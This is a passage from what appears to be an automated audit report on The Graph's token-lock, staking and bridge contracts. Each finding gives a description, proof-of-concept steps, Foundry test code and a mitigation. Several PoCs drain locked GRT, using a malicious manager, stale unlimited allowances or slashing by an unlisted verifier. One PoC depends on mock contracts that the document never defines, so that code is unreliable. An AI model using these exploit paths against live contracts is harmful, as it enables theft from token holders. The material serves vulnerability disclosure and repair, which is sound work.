L2 wallets initialized from L1 keep the inherited GraphTokenLockWallet.setManager() owner power even though initializeFromL1() makes the wallet non-revocable, accepted, and release-blocked until endTime. The owner is copied from untrusted bridged wallet data: `OwnableInitializable._initialize(_walletData.owner); beneficiary = _walletData.beneficiary; ... releaseStartTime = _walletData.endTime; revocable = Revocability.Disabled; _setManager(_manager);`. The inherited owner can later call `setManager(address _newManager) external onlyOwner`, and `approveProtocol()` blindly grants max allowance to every destination returned by the current manager: `address[] memory dstList = manager.getTokenDestinations(); for (...) { token.approve(dstList[i], type(uint256).max); }`. If the same unprivileged account is owner and beneficiary, or if owner and beneficiary collude, they replace the canonical manager with a malicious manager that returns an attacker-controlled spender, call approveProtocol(), and transfer all locked GRT out with transferFrom() while releasableAmount() is still zero.

## Impact
Locked L2 GRT can be extracted before the L2 releaseStartTime/endTime, defeating the token-lock maturity gate. For high-value transferred wallets this can prematurely release more than $1M of GRT directly from token lock contracts.

## Proof of Concept
1. A wallet is bridged to L2 with owner and beneficiary controlled by the attacker and endTime far in the future. 2. The created L2GraphTokenLockWallet has releasableAmount() == 0, so normal release is blocked. 3. The owner calls setManager(evilManager). 4. The beneficiary calls approveProtocol(); the evil manager returns the attacker as a token destination, so the wallet approves the attacker for uint256.max. 5. The attacker calls GRT.transferFrom(wallet, attacker, lockedAmount) and drains the locked balance before maturity.

## Proof of Code
pragma solidity 0.7.3;
pragma experimental ABIEncoderV2;
import 'forge-std/Test.sol';
import '../contracts/L2GraphTokenLockManager.sol';
import '../contracts/L2GraphTokenLockWallet.sol';
import '../contracts/GraphTokenLockWallet.sol';
import '../contracts/IGraphTokenLockManager.sol';
import '../contracts/IGraphTokenLock.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
contract MockGRT is IERC20 { mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public override allowance; uint256 public override totalSupply; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; emit Transfer(address(0),to,amount); } function transfer(address to,uint256 amount) external override returns(bool){ require(balanceOf[msg.sender]>=amount,'bal'); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; emit Transfer(msg.sender,to,amount); return true; } function approve(address spender,uint256 amount) external override returns(bool){ allowance[msg.sender][spender]=amount; emit Approval(msg.sender,spender,amount); return true; } function transferFrom(address from,address to,uint256 amount) external override returns(bool){ require(balanceOf[from]>=amount,'bal'); require(allowance[from][msg.sender]>=amount,'allow'); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; emit Transfer(from,to,amount); return true; } }
contract EvilManager is IGraphTokenLockManager { address public spender; constructor(address s){ spender=s; } function getTokenDestinations() external view override returns(address[] memory out){ out=new address[](1); out[0]=spender; } function token() external override returns(IERC20){ return IERC20(address(0)); } function setMasterCopy(address) external override {} function createTokenLockWallet(address,address,uint256,uint256,uint256,uint256,uint256,uint256,IGraphTokenLock.Revocability) external override {} function deposit(uint256) external override {} function withdraw(uint256) external override {} function addTokenDestination(address) external override {} function removeTokenDestination(address) external override {} function isTokenDestination(address) external view override returns(bool){ return false; } function setAuthFunctionCall(string calldata,address) external override {} function unsetAuthFunctionCall(string calldata) external override {} function setAuthFunctionCallMany(string[] calldata,address[] calldata) external override {} function getAuthFunctionCallTarget(bytes4) external view override returns(address){ return address(0); } function isAuthFunctionCall(bytes4) external view override returns(bool){ return false; } }
contract L2ManagerBypassPoC is Test { function testOwnerBeneficiaryCanDrainBeforeMaturityByReplacingManager() public { address attacker=address(0xA11CE); address gateway=address(0xCAFE); address l1Tool=address(0xBEEF); vm.warp(1000); MockGRT grt=new MockGRT(); L2GraphTokenLockWallet impl=new L2GraphTokenLockWallet(); L2GraphTokenLockManager manager=new L2GraphTokenLockManager(IERC20(address(grt)),address(impl),gateway,l1Tool); uint256 amount=1_000_000 ether; grt.mint(address(manager),amount); L2GraphTokenLockManager.TransferredWalletData memory data=L2GraphTokenLockManager.TransferredWalletData({l1Address:address(0x1234),owner:attacker,beneficiary:attacker,managedAmount:amount,startTime:block.timestamp,endTime:block.timestamp+365 days}); vm.prank(gateway); manager.onTokenTransfer(l1Tool,amount,abi.encode(data)); address wallet=manager.l1WalletToL2Wallet(data.l1Address); assertEq(grt.balanceOf(wallet),amount); assertEq(IGraphTokenLock(wallet).releasableAmount(),0); EvilManager evil=new EvilManager(attacker); vm.prank(attacker); GraphTokenLockWallet(wallet).setManager(address(evil)); vm.prank(attacker); GraphTokenLockWallet(wallet).approveProtocol(); vm.prank(attacker); grt.transferFrom(wallet,attacker,amount); assertEq(grt.balanceOf(attacker),amount); assertEq(grt.balanceOf(wallet),0); } }

## Suggested Mitigation
Do not allow L2 transferred wallets to switch away from the canonical manager, or restrict setManager() to a governance allowlist and require beneficiary confirmation. For L2GraphTokenLockWallet, add a flag set by initializeFromL1() that permanently disables setManager(), or override setManager() to require the canonical manager/governance and an approved manager registry.


## [M-83]. Floored periodDuration lets availableAmount exceed managedAmount before endTime

## id: Cg-P2nt4RDg2y-BXltUrN

## Derived From Pattern/Invariant
PricePrecisionOrRoundingError

## Exploit Type
RoundingError

## Location
GraphTokenLockWallet.availableAmount

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 2
## Minimim Privilege Required:RequiresRole


## Description
periodDuration() floors duration / periods, and availableAmount() multiplies passedPeriods by amountPerPeriod without capping passedPeriods to periods or the result to managedAmount:

function periodDuration() public view returns (uint256) {
    return duration().div(periods);
}
function availableAmount() public view returns (uint256) {
    if (current > endTime) return managedAmount;
    return passedPeriods().mul(amountPerPeriod());
}

When duration is not evenly divisible by periods, currentPeriod can advance past the configured number of periods before endTime. If the wallet holds surplus GRT, release() can transfer and record more than managedAmount before the schedule end, corrupting totalOutstandingAmount().

## Impact
A beneficiary can receive the entire managed amount early and can push releasedAmount above managedAmount when the wallet holds surplus. This breaks accounting and can permanently DoS surplus accounting functions.

## Proof of Concept
1. Initialize a wallet with duration = 100 seconds, periods = 30, managedAmount = 30.
2. periodDuration() floors to 3 seconds.
3. At startTime + 99, still before endTime, passedPeriods() is 33 and availableAmount() is 33.
4. If the wallet balance is 35 due to surplus, release() transfers 33 and records releasedAmount = 33 > managedAmount.
5. totalOutstandingAmount() underflows.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";

contract RoundedPeriodPoC is Test { function testAvailableAmountCanExceedManagedAmount() external { address owner=address(this); address beneficiary=address(0xB4); MockToken token=new MockToken(); MockManager manager=new MockManager(); GraphTokenLockWallet wallet=new GraphTokenLockWallet(); uint256 start=1000; vm.warp(start); wallet.initialize(address(manager), owner, beneficiary, address(token), 30 ether, start, start+100, 30, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 35 ether); vm.warp(start+99); assertGt(wallet.availableAmount(), wallet.managedAmount()); vm.prank(beneficiary); wallet.release(); assertGt(wallet.releasedAmount(), wallet.managedAmount()); vm.expectRevert(); wallet.totalOutstandingAmount(); } }

// Uses the MockToken and MockManager definitions from the approveProtocol PoC.

## Suggested Mitigation
Require duration() % periods == 0 or cap passedPeriods to periods and cap availableAmount to managedAmount. Also use current >= endTime for the fully vested branch if endTime is intended to be inclusive.


## [L-84]. Delegation minimum is checked before tax, allowing active delegated positions below MINIMUM_DELEGATION

## id: TNMAz3cX9t88fcgV4atgG

## Derived From Pattern/Invariant
AccountingInvariantViolation / PricePrecisionOrRoundingError

## Exploit Type
AccountingInvariantViolation

## Location
StakingExtension._delegate

## Finding Status: Valid
### Finding Status Justification: The described path exists in in-scope production code: external delegate() is permissionless except for notPartialPaused, pulls tokens, then calls private _delegate(). _delegate() checks _tokens >= MINIMUM_DELEGATION before calling _collectTax(), then records delegatedTokens = _tokens - delegationTax into pool.tokens and mints shares from delegatedTokens. With any nonzero __delegationTaxPercentage below 100%, a gross delegation of exactly MINIMUM_DELEGATION succeeds and creates an active net delegation below MINIMUM_DELEGATION. There is no later require(delegatedTokens >= MINIMUM_DELEGATION). The comments explicitly say the minimum is to prevent rounding attacks, so the code contradicts the stated minimum-active-position intent rather than documenting the risk as accepted. The path is not test/mock/vendor code, does not require a compromised privileged actor once a valid nonzero tax parameter exists, and does not depend solely on user error.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`_delegate()` enforces `MINIMUM_DELEGATION` on the gross `_tokens` value before delegation tax is burned, but the actual active delegation is `delegatedTokens = _tokens - delegationTax`:

`require(_tokens >= MINIMUM_DELEGATION, "!minimum-delegation");`
`uint256 delegationTax = _collectTax(graphToken(), _tokens, __delegationTaxPercentage);`
`uint256 delegatedTokens = _tokens.sub(delegationTax);`
`pool.tokens = pool.tokens.add(delegatedTokens);`

With any nonzero delegation tax, a user can call `delegate(indexer, MINIMUM_DELEGATION)` and receive an active delegation smaller than `MINIMUM_DELEGATION`. This contradicts the stated anti-rounding invariant and allows dust active positions that the minimum was intended to prevent.

## Impact
The active delegation accounting can contain positions below the protocol's minimum delegation threshold, weakening the anti-rounding/dust invariant and creating inconsistent behavior between initial delegation and remaining-delegation checks in `_undelegate()`.

## Proof of Concept
1. Governance has configured a nonzero delegation tax, e.g. 1%.
2. A delegator calls `delegate(indexer, MINIMUM_DELEGATION)`.
3. `_delegate()` accepts the call because the gross amount equals the minimum.
4. `_collectTax()` burns 1%, so only `0.99 * MINIMUM_DELEGATION` is added to `pool.tokens`.
5. The delegator has active shares representing less than `MINIMUM_DELEGATION`, violating the intended minimum active position invariant.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MinimumBeforeTaxHarness {
    uint256 constant MINIMUM_DELEGATION = 1e18;
    uint256 constant MAX_PPM = 1_000_000;
    uint256 public delegationTaxPercentage = 10_000; // 1%
    uint256 public poolTokens;
    uint256 public poolShares;
    mapping(address => uint256) public shares;

    function delegate(address delegator, uint256 tokens) external returns (uint256) {
        require(tokens >= MINIMUM_DELEGATION, "!minimum-delegation");
        uint256 tax = tokens * delegationTaxPercentage / MAX_PPM;
        uint256 delegatedTokens = tokens - tax;
        uint256 minted = poolTokens == 0 ? delegatedTokens : delegatedTokens * poolShares / poolTokens;
        require(minted > 0, "!shares");
        poolTokens += delegatedTokens;
        poolShares += minted;
        shares[delegator] += minted;
        return minted;
    }

    function activeDelegation(address delegator) external view returns (uint256) {
        return shares[delegator] * poolTokens / poolShares;
    }
}

contract MinimumBeforeTaxTest is Test {
    function testGrossMinimumAllowsBelowMinimumActiveDelegation() external {
        MinimumBeforeTaxHarness h = new MinimumBeforeTaxHarness();
        address delegator = address(0xD1);
        h.delegate(delegator, 1e18);
        assertEq(h.poolTokens(), 0.99e18);
        assertGt(1e18, h.activeDelegation(delegator));
    }
}

## Suggested Mitigation
Calculate `delegatedTokens` first and enforce `require(delegatedTokens >= MINIMUM_DELEGATION, "!minimum-delegation")`. Consider rejecting 100% tax if delegation is expected to remain available.


## [H-85]. Removed GraphTokenLockWallet token destinations keep unlimited allowance and can drain wallets after revocation

## id: ByZDTLDCFrgVnsuMdV4fD

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccessControl

## Location
GraphTokenLockWallet.approveProtocol / revokeProtocol

## Finding Status: Valid
### Finding Status Justification: The stale allowance root cause exists. approveProtocol iterates manager.getTokenDestinations and approves each for uint256.max. revokeProtocol also only iterates the current manager list and approves those entries for zero. GraphTokenLockManager can remove destinations, after which the removed spender is no longer returned and cannot be cleared by revokeProtocol. There is no historical allowance tracking or arbitrary revoke function. The code is in-scope production token-distribution code. The comments say max approvals are for convenience, but they do not explicitly accept the risk that removed destinations retain spending power. The allowance exists in today's code; if the stale spender has a callable pull path, no wallet-side safeguard prevents transferFrom. This does not require beneficiary user error or compromised privileged credentials, though manager removal is a normal privileged maintenance action.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
approveProtocol() grants max allowance to every current manager token destination. If the manager later removes a destination, existing wallets do not clear the old allowance. revokeProtocol() cannot clear it either because it only iterates the manager's current destination list. This leaves removed destinations with full spending power even after `manager.isTokenDestination(dst)` becomes false. Vulnerable snippet: `approveProtocol(): token.approve(dstList[i], type(uint256).max);` and `revokeProtocol(): address[] memory dstList = manager.getTokenDestinations(); ... token.approve(dstList[i], 0);`

## Impact
A destination that is removed from the manager can continue pulling all approved GRT from wallets that previously called approveProtocol(). If the removed destination exposes a public pull path or is compromised after removal, locked wallet balances can be stolen directly despite governance having revoked that destination's authorization.

## Proof of Concept
1. The manager lists destination D and a wallet beneficiary calls approveProtocol(), granting D max allowance. 2. The manager removes D, so D is no longer an authorized token destination. 3. The beneficiary calls revokeProtocol(), but the function sees an empty current destination list and does not clear D's stale allowance. 4. D still calls transferFrom(wallet, attacker, amount) and drains the wallet.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MutableManager {
    address[] internal destinations;
    constructor(address dst) { destinations.push(dst); }
    function clearDestinations() external { delete destinations; }
    function getTokenDestinations() external view returns (address[] memory) { return destinations; }
    function getAuthFunctionCallTarget(bytes4) external pure returns (address) { return address(0); }
}

contract PullDestination {
    function drain(MockERC20 token, address from, address to, uint256 amount) external { require(token.transferFrom(from, to, amount), "pull failed"); }
}

contract StaleDestinationAllowancePoCTest is Test {
    function testRemovedDestinationStillDrainsAfterRevokeProtocol() public {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        address attacker = address(0xE0A);
        MockERC20 token = new MockERC20();
        PullDestination destination = new PullDestination();
        MutableManager manager = new MutableManager(address(destination));
        GraphTokenLockWallet wallet = new GraphTokenLockWallet();

        wallet.initialize(address(manager), owner, beneficiary, address(token), 100 ether, 1000, 2000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled);
        token.mint(address(wallet), 100 ether);

        vm.prank(beneficiary);
        wallet.approveProtocol();
        assertGt(token.allowance(address(wallet), address(destination)), 100 ether);

        manager.clearDestinations();
        vm.prank(beneficiary);
        wallet.revokeProtocol();

        assertGt(token.allowance(address(wallet), address(destination)), 100 ether);
        destination.drain(token, address(wallet), attacker, 100 ether);
        assertEq(token.balanceOf(attacker), 100 ether);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}

## Suggested Mitigation
Track per-wallet approved destinations and clear allowances for destinations removed from the manager, or make manager removal call a wallet-level allowance revocation mechanism. At minimum, expose `revokeProtocol(address dst)` so beneficiaries can clear stale destinations even after manager removal, and avoid unlimited approvals where possible.


## [H-86]. Locked GRT can be provisioned to unallowed verifiers through HorizonStaking.provision and escaped via verifier slash rewards

## id: BGltva0zz65tEFYsF1FFj

## Derived From Pattern/Invariant
AccessControlOrAuthByPass: locked stake must only be provisioned to allowed locked verifiers

## Exploit Type
AuthByPass

## Location
HorizonStaking.provision

## Finding Status: Valid
### Finding Status Justification: The normal provision() entrypoint exists in in-scope HorizonStaking and lacks the _allowedLockedVerifiers check that provisionLocked() performs. _createProvision() does not distinguish locked-wallet serviceProviders, and _isAuthorized() returns true when the caller is the serviceProvider, while operators can also be authorized. Once __DEPRECATED_thawingPeriod is cleared, arbitrary verifiers are allowed by _createProvision(). slash() then lets that verifier transfer up to maxVerifierCut of provider tokens to verifierDestination; maxVerifierCut may be 1,000,000 PPM. The storage comment says locked verifier whitelisting exists to prevent locked tokens escaping via arbitrary verifiers, so this is not accepted by design. No complete safeguard blocks the bypass.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The locked-verifier restriction is only enforced by provisionLocked(), but the normal provision() entrypoint can create the same provision without checking _allowedLockedVerifiers once the legacy transition thawing period has been cleared. A GraphTokenLockWallet can be the serviceProvider and can call provision() as itself, satisfying onlyAuthorized because _operator == _serviceProvider. The unallowed verifier can then call slash() and receive up to maxVerifierCut of the locked stake as verifier reward. Vulnerable snippets: function provision(...) external ... onlyAuthorized(...) { _createProvision(...); } versus function provisionLocked(...) external ... { require(_allowedLockedVerifiers[verifier], ...); _createProvision(...); }. _createProvision() itself does not know whether the serviceProvider is a locked wallet and therefore does not enforce the whitelist.

## Impact
Locked GRT that should remain subject to token-lock restrictions can be routed to an arbitrary verifier and transferred out as slash rewards. For large locked wallets this can cause significant direct loss of locked user/protocol funds from HorizonStaking.

## Proof of Concept
1. Legacy transition ends so __DEPRECATED_thawingPeriod == 0. 2. A GraphTokenLockWallet has idle staked GRT in HorizonStaking. 3. The wallet or its authorized beneficiary/operator calls provision(wallet, attackerVerifier, amount, 1000000, thawingPeriod) instead of provisionLocked(). 4. _createProvision accepts attackerVerifier because the transition verifier restriction is disabled and no locked-verifier check is performed. 5. attackerVerifier calls slash(wallet, amount, amount, attackerDestination). 6. slash() accepts msg.sender as the verifier and transfers tokensVerifier to attackerDestination, bypassing the locked verifier whitelist.

## Proof of Code
// Foundry-style regression test for the existing Horizon staking test harness.
function test_lockedWalletCanBypassAllowedVerifierViaNormalProvision() public {
    address lockedWallet = makeAddr("lockedWallet");
    address attackerVerifier = makeAddr("attackerVerifier");
    address attackerDestination = makeAddr("attackerDestination");
    uint256 amount = 1_000_000 ether;

    // Harness setup: transition ended, attackerVerifier is not in _allowedLockedVerifiers,
    // and lockedWallet has idle staked GRT.
    stakingHarness.setDeprecatedThawingPeriod(0);
    stakingHarness.setAllowedLockedVerifier(attackerVerifier, false);
    deal(address(grt), address(stakingHarness), amount);
    stakingHarness.setServiceProviderStake(lockedWallet, amount, 0);

    vm.prank(lockedWallet);
    stakingHarness.provision(lockedWallet, attackerVerifier, amount, 1_000_000, 7 days);

    IHorizonStakingTypes.Provision memory p = stakingHarness.getProvision(lockedWallet, attackerVerifier);
    assertEq(p.tokens, amount);
    assertEq(stakingHarness.isAllowedLockedVerifier(attackerVerifier), false);

    uint256 beforeBalance = grt.balanceOf(attackerDestination);
    vm.prank(attackerVerifier);
    stakingHarness.slash(lockedWallet, amount, amount, attackerDestination);

    assertEq(grt.balanceOf(attackerDestination) - beforeBalance, amount);
}

## Suggested Mitigation
Move the locked-verifier invariant into _createProvision or otherwise mark locked-wallet service providers in HorizonStaking and require _allowedLockedVerifiers[_verifier] for every provision created from locked stake, including provision() and stakeToProvision().


## [M-87]. Partial pause bypass in StakingExtension.withdrawDelegated allows redelegation while delegation is stopped

## id: krGg_RX12KcU0dWwCrjDk

## Derived From Pattern/Invariant
UnprotectedPauseOrStop / MaturityorGatingByPass

## Exploit Type
PausableEmergencyStop

## Location
StakingExtension.withdrawDelegated

## Finding Status: Valid
### Finding Status Justification: The code path exists exactly as described. delegate() and undelegate() are guarded by notPartialPaused, while withdrawDelegated() is guarded only by notPaused. withdrawDelegated() calls _withdrawDelegated(), and when _newIndexer is nonzero, _withdrawDelegated() resets the matured lock and directly calls private _delegate(_delegator, _delegateToIndexer, tokensToWithdraw). Because _delegate() itself has no notPartialPaused modifier, matured locked tokens can be converted into active delegation while direct delegate() is partially paused. The only safeguard is full pause via notPaused, which does not fully block the exact partial-pause bypass. This is in-scope production code, requires only a delegator with mature locked tokens, and is not documented as intentionally accepted behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`delegate()` and `undelegate()` are protected by `notPartialPaused`, but `withdrawDelegated()` is only protected by `notPaused`. When `_newIndexer != address(0)`, `_withdrawDelegated()` clears a matured lock and calls the private `_delegate()` directly, bypassing the partial-pause gate:

`function withdrawDelegated(address _indexer, address _newIndexer) external override notPaused returns (uint256) { return _withdrawDelegated(msg.sender, _indexer, _newIndexer); }`

`if (_delegateToIndexer != address(0)) { _delegate(_delegator, _delegateToIndexer, tokensToWithdraw); }`

During a partial pause, governance intends to stop state transitions that create or increase active delegation pool positions. A delegator with matured locked tokens can still move those tokens into any staked indexer, increasing the target pool's `tokens`, `shares`, and the delegator's active shares while direct `delegate()` is paused.

## Impact
Emergency partial pause does not fully stop new active delegation exposure. During an incident, permissionless users with matured undelegations can continue increasing delegation pools, bypassing the protocol's intended pause control and potentially worsening an active staking/delegation incident.

## Proof of Concept
1. A delegator delegates to `oldIndexer` and later undelegates, creating `tokensLocked`.
2. Epochs advance until `currentEpoch >= tokensLockedUntil`.
3. Governance/controller sets the staking system to partially paused, but not fully paused.
4. Direct `delegate(newIndexer, amount)` reverts because it is `notPartialPaused`.
5. The delegator calls `withdrawDelegated(oldIndexer, newIndexer)`.
6. The call succeeds and `_withdrawDelegated()` invokes private `_delegate()`, increasing `newIndexer`'s active delegation pool despite the partial pause.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract PartialPauseHarness {
    struct Delegation { uint256 shares; uint256 tokensLocked; uint256 tokensLockedUntil; }
    struct Pool { uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }

    mapping(address => Pool) internal pools;
    mapping(address => uint256) public stake;
    bool public paused;
    bool public partialPaused;
    uint256 public epoch = 10;

    modifier notPaused() { require(!paused, "paused"); _; }
    modifier notPartialPaused() { require(!paused && !partialPaused, "partial paused"); _; }

    function seed(address oldIndexer, address newIndexer, address delegator) external {
        stake[oldIndexer] = 100 ether;
        stake[newIndexer] = 100 ether;
        pools[oldIndexer].delegators[delegator].tokensLocked = 10 ether;
        pools[oldIndexer].delegators[delegator].tokensLockedUntil = 9;
    }

    function setPartialPaused(bool value) external { partialPaused = value; }

    function delegate(address indexer, uint256 amount) external notPartialPaused returns (uint256) {
        return _delegate(msg.sender, indexer, amount);
    }

    function withdrawDelegated(address indexer, address newIndexer) external notPaused returns (uint256) {
        return _withdrawDelegated(msg.sender, indexer, newIndexer);
    }

    function poolOf(address indexer) external view returns (uint256 tokens, uint256 shares) {
        return (pools[indexer].tokens, pools[indexer].shares);
    }

    function _withdrawDelegated(address delegator, address indexer, address delegateToIndexer) internal returns (uint256) {
        Delegation storage d = pools[indexer].delegators[delegator];
        require(d.tokensLockedUntil > 0 && epoch >= d.tokensLockedUntil, "!tokens");
        uint256 amount = d.tokensLocked;
        d.tokensLocked = 0;
        d.tokensLockedUntil = 0;
        if (delegateToIndexer != address(0)) _delegate(delegator, delegateToIndexer, amount);
        return amount;
    }

    function _delegate(address delegator, address indexer, uint256 amount) internal returns (uint256) {
        require(stake[indexer] > 0, "!stake");
        Pool storage p = pools[indexer];
        uint256 shares = p.tokens == 0 ? amount : amount * p.shares / p.tokens;
        require(shares > 0, "!shares");
        p.tokens += amount;
        p.shares += shares;
        p.delegators[delegator].shares += shares;
        return shares;
    }
}

contract PartialPauseBypassTest is Test {
    function testWithdrawDelegatedRedelegatesWhilePartialPaused() external {
        PartialPauseHarness h = new PartialPauseHarness();
        address delegator = address(0xD1);
        address oldIndexer = address(0xA11CE);
        address newIndexer = address(0xB0B);
        h.seed(oldIndexer, newIndexer, delegator);
        h.setPartialPaused(true);

        vm.prank(delegator);
        vm.expectRevert("partial paused");
        h.delegate(newIndexer, 10 ether);

        (uint256 tokensBefore, uint256 sharesBefore) = h.poolOf(newIndexer);
        vm.prank(delegator);
        h.withdrawDelegated(oldIndexer, newIndexer);
        (uint256 tokensAfter, uint256 sharesAfter) = h.poolOf(newIndexer);

        assertGt(tokensAfter, tokensBefore);
        assertGt(sharesAfter, sharesBefore);
    }
}

## Suggested Mitigation
Apply `notPartialPaused` to `withdrawDelegated()` when `_newIndexer != address(0)`, or split the function into a withdraw-only path allowed during partial pause and a redelegate path that is blocked by partial pause.


## [M-88]. Live thawingPeriod changes can extend existing delegators' withdrawal lock in HorizonStaking._undelegate

## id: lHrTkJ7wGETXjfF9G4yA6

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
HorizonStaking.setProvisionParameters / acceptProvisionParameters / _undelegate

## Finding Status: Valid
### Finding Status Justification: The reported path is present. setProvisionParameters() updates thawingPeriodPending, acceptProvisionParameters() applies it, and _undelegate() computes a new thaw request using the live provision thawingPeriod. Delegation state stores shares only; no code shown snapshots the thawingPeriod at delegation time. The only bound is _maxThawingPeriod at staging time, which does not protect already-delegated users from later increases within the allowed range. No complete safeguard such as notice, grace period, per-delegator maximum, or old-terms exit exists in the provided code. The issue is in an in-scope production contract and is presently reachable through ordinary provider/verifier parameter updates, not through admin compromise or pure victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
Existing delegations do not snapshot the provision thawing period when the delegator enters the pool. The service provider or authorized operator can stage a new thawingPeriod and the verifier can accept it at any time; later, _undelegate() reads the live provision parameter to compute thawingUntil for already-existing delegators. Vulnerable flow: setProvisionParameters() writes prov.thawingPeriodPending, acceptProvisionParameters() assigns prov.thawingPeriod = prov.thawingPeriodPending, and _undelegate() later computes uint64 thawingUntil = uint64(block.timestamp + uint256(_provisions[_serviceProvider][_verifier].thawingPeriod)). A delegator who entered when the provision advertised a short exit period can therefore be forced into a much longer unbonding period before they can withdraw or redelegate.

## Impact
Existing delegated GRT can be temporarily frozen for the newly accepted thawingPeriod instead of the period visible when the user delegated. This removes timely exit guarantees and keeps delegators exposed to slashable pool risk for longer than expected.

## Proof of Concept
1. A provider creates a provision with a short thawingPeriod, e.g. 1 day. 2. A victim delegates GRT to that provision. 3. The provider stages a much longer thawingPeriod, e.g. 365 days. 4. The verifier accepts the pending parameters. 5. The victim calls undelegate(). 6. The thaw request is created with block.timestamp + 365 days, not the 1 day period that was active when the victim delegated.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

contract HorizonStakingThawingModel {
    struct Provision { uint64 thawingPeriod; uint64 thawingPeriodPending; }
    mapping(address => mapping(address => Provision)) public provisions;
    mapping(address => mapping(address => mapping(address => uint256))) public shares;
    address public provider;
    address public verifier;

    constructor(address provider_, address verifier_) { provider = provider_; verifier = verifier_; }
    modifier onlyProvider() { require(msg.sender == provider, "not provider"); _; }

    function provision(uint64 thawingPeriod) external onlyProvider {
        provisions[provider][verifier] = Provision(thawingPeriod, thawingPeriod);
    }

    function delegate(address delegator, uint256 amount) external {
        shares[provider][verifier][delegator] += amount;
    }

    function setProvisionParameters(uint64 newThawingPeriod) external onlyProvider {
        provisions[provider][verifier].thawingPeriodPending = newThawingPeriod;
    }

    function acceptProvisionParameters() external {
        require(msg.sender == verifier, "not verifier");
        Provision storage prov = provisions[provider][verifier];
        prov.thawingPeriod = prov.thawingPeriodPending;
    }

    function undelegate(address delegator) external view returns (uint64) {
        require(shares[provider][verifier][delegator] > 0, "no shares");
        return uint64(block.timestamp + uint256(provisions[provider][verifier].thawingPeriod));
    }
}

contract HorizonStakingThawingPeriodPoC is Test {
    function test_existingDelegatorReceivesMutatedThawingPeriod() public {
        address provider = address(0xA11CE);
        address verifier = address(0xB0B);
        address victim = address(0xCAFE);
        HorizonStakingThawingModel staking = new HorizonStakingThawingModel(provider, verifier);

        vm.prank(provider);
        staking.provision(uint64(1 days));
        staking.delegate(victim, 1000 ether);
        uint256 originalExit = block.timestamp + 1 days;

        vm.prank(provider);
        staking.setProvisionParameters(uint64(365 days));
        vm.prank(verifier);
        staking.acceptProvisionParameters();

        uint64 thawingUntil = staking.undelegate(victim);
        assertEq(thawingUntil, uint64(block.timestamp + 365 days));
        assertGt(thawingUntil, originalExit);
    }
}


## Suggested Mitigation
Snapshot the active thawingPeriod into each delegator's position or into each delegation epoch at delegation time and use the snapshot when creating thaw requests. Alternatively, apply increases only to future delegations, add an exit grace period before longer thawing periods become active, and emit/track parameter epochs so existing shares remain bound to the period under which they were deposited.


## [H-89]. Stale L2 mint allowance can be frontrun to over-mint GRT and brick future L2 withdrawals

## id: QVFoe8ghW2UZrsBc4YTzn

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation: live L2 mint allowance rate is used during pending L2-to-L1 withdrawal finalization before the governor update lands

## Exploit Type
GlobalParamMidFlowManipulation

## Location
L1GraphTokenGateway.finalizeInboundTransfer

## Finding Status: Valid
### Finding Status Justification: The cited code path exists in in-scope L1GraphTokenGateway. finalizeInboundTransfer is callable through the authenticated Arbitrum L2-to-L1 path and, when the current escrow balance is insufficient, calls _mintFromL2. _mintFromL2 checks _l2MintAmountAllowed, which computes allowance using accumulatedL2MintAllowanceAtBlock(block.number) and the live l2MintAllowancePerBlock. updateL2MintAllowance is onlyGovernor and can only be called for a past block, so a legitimate already-executable withdrawal can be finalized before the lower-rate update is mined or earlier in the same block. There is no complete safeguard applying pending lower rates, pausing this transition, or checking that the post-update allowance remains above totalMintedFromL2. The bridge/counterpart checks authenticate messages but do not block this exact stale-parameter ordering path. The behavior is not explicitly documented as an accepted risk. Exploitation uses public withdrawal finalization ordering around an ordinary governance update and does not require compromised privileged keys or user-only misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
